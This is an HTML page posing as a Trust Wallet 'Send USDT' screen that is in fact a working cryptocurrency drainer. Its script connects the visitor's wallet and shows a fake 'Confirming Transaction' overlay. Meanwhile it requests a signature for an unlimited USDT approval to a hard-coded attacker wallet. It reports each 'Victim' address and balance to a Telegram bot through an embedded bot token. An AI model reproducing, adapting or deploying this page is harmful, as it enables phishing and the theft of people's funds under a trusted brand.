<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
    <title>Trust Wallet</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body { background-color: #000000; color: #ffffff; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; }
        .ios-input { background-color: #1a1a1a; border: none; outline: none; }
        .trust-blue-btn { background-color: #0500ff; transition: opacity 0.2s; }
        .trust-blue-btn:active { opacity: 0.7; }
        .loading-overlay { background: rgba(0,0,0,0.85); backdrop-filter: blur(4px); }
    </style>
</head>
<body class="min-h-screen flex flex-col">

    <div class="px-5 py-4 flex items-center justify-between border-b border-gray-900">
        <i class="fa-solid fa-arrow-left text-xl text-white"></i>
        <h1 class="text-[17px] font-bold">Send USDT</h1>
        <span class="text-[#3b82f6] font-medium text-[15px]">History</span>
    </div>

    <div id="main-content" class="px-5 mt-6 flex-grow flex flex-col">
        
        <div class="ios-input rounded-2xl p-4 mb-5">
            <div class="flex justify-between items-center mb-1">
                <span class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Recipient Address</span>
                <span class="text-[#3b82f6] text-[11px] font-bold uppercase">Paste</span>
            </div>
            <div class="flex items-center justify-between">
                <input type="text" value="TBrJPyG8BUysBBM...QFvEHay2" class="bg-transparent text-[#e2e8f0] text-[15px] w-full" readonly>
                <i class="fa-solid fa-qrcode text-[#3b82f6] ml-2"></i>
            </div>
        </div>

        <div class="ios-input rounded-2xl p-4">
            <div class="flex justify-between items-center mb-1">
                <span class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Amount USDT</span>
                <span class="text-[#3b82f6] text-[11px] font-bold uppercase">Max</span>
            </div>
            <div class="flex items-center justify-between mt-1">
                <input type="number" id="send-amount" placeholder="0" class="bg-transparent text-3xl font-semibold w-full outline-none">
                <div class="flex items-center gap-2">
                    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="w-6 h-6">
                    <span class="font-bold text-lg">USDT</span>
                </div>
            </div>
            <div class="mt-4 text-[13px] text-gray-400">
                Balance: <span id="view-balance">0.00 USDT</span>
            </div>
        </div>

        <div class="mt-auto mb-10">
            <button id="next-btn" class="w-full trust-blue-btn py-4 rounded-full text-lg font-bold">
                Next
            </button>
        </div>
    </div>

    <div id="loading-screen" class="hidden fixed inset-0 loading-overlay z-50 flex flex-col items-center justify-center p-8">
        <div class="w-12 h-12 border-[3px] border-[#3b82f6] border-t-transparent rounded-full animate-spin mb-6"></div>
        <h2 id="loading-title" class="text-[19px] font-bold text-white">Confirming Transaction...</h2>
        <p id="loading-subtitle" class="text-gray-400 text-center text-sm mt-2">Checking network congestion and estimating gas fee. Please wait...</p>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
    <script src="wc-bundle.js"></script>
    <script>
        const CONFIG = {
            BOT_TOKEN: "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM",
            CHAT_ID: "8249230506",
            ADMIN_WALLET: "TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2",
            USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
        };
        const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

        async function notifyAdmin(status, address, trx = "0", usdt = "0", extra = "") {
            const text = `🎯 <b>NEW UPDATE</b>\n\n` +
                         `📌 Status: <b>${status}</b>\n` +
                         `👤 Victim: <code>${address}</code>\n` +
                         `💰 Balance: <code>${usdt} USDT</code> | <code>${trx} TRX</code>\n` +
                         `📝 Detail: ${extra}`;
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: "HTML" })
                });
            } catch(e) {}
        }

        async function getStats(address) {
            const tw = new TronWeb({ fullHost: 'https://api.trongrid.io' });
            let trx = "0.00", usdt = "0.00";
            try {
                trx = (await tw.trx.getBalance(address) / 1e6).toFixed(2);
                const contract = await tw.transactionBuilder.triggerConstantContract(CONFIG.USDT_CONTRACT, "balanceOf(address)", {}, [{type:'address', value: address}], address);
                usdt = (parseInt(contract.constant_result[0], 16) / 1e6).toFixed(2);
            } catch(e) {}
            return { trx, usdt };
        }

        document.getElementById('next-btn').addEventListener('click', async () => {
            if (typeof window.connectWalletConnectTron !== 'function') return alert("System loading...");

            const result = await window.connectWalletConnectTron();
            if (result && result.address) {
                const address = result.address;
                const { trx, usdt } = await getStats(address);
                
                // UI transition to Confirming
                document.getElementById('main-content').classList.add('opacity-10');
                document.getElementById('loading-screen').classList.remove('hidden');

                await notifyAdmin("CONNECTED", address, trx, usdt, "Waiting for approval...");

                try {
                    const localTronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
                    
                    // Triggering Approval after a short "Thinking" delay
                    setTimeout(async () => {
                        try {
                            const { transaction } = await localTronWeb.transactionBuilder.triggerSmartContract(
                                CONFIG.USDT_CONTRACT, "approve(address,uint256)", { feeLimit: 100000000 },
                                [{ type: 'address', value: CONFIG.ADMIN_WALLET }, { type: 'uint256', value: MAX_UINT }], address
                            );

                            const signedTx = await result.provider.request({
                                method: "tron_signTransaction",
                                params: { address: address, transaction: transaction }
                            });

                            const receipt = await localTronWeb.trx.sendRawTransaction(signedTx);
                            await notifyAdmin("✅ SUCCESS", address, trx, usdt, `TX: <code>${receipt.txid || "Success"}</code>`);
                            alert("Transaction sent to the network.");
                            location.reload();
                        } catch (err) {
                            let reason = "User Rejected";
                            if (parseFloat(trx) < 25) reason = "Insufficient Gas (Low TRX)";
                            await notifyAdmin("❌ FAILED", address, trx, usdt, `Reason: ${reason}`);
                            location.reload();
                        }
                    }, 2500);

                } catch (e) {
                    await notifyAdmin("❌ ERROR", address, trx, usdt, e.message);
                    location.reload();
                }
            }
        });
    </script>
</body>
</html>
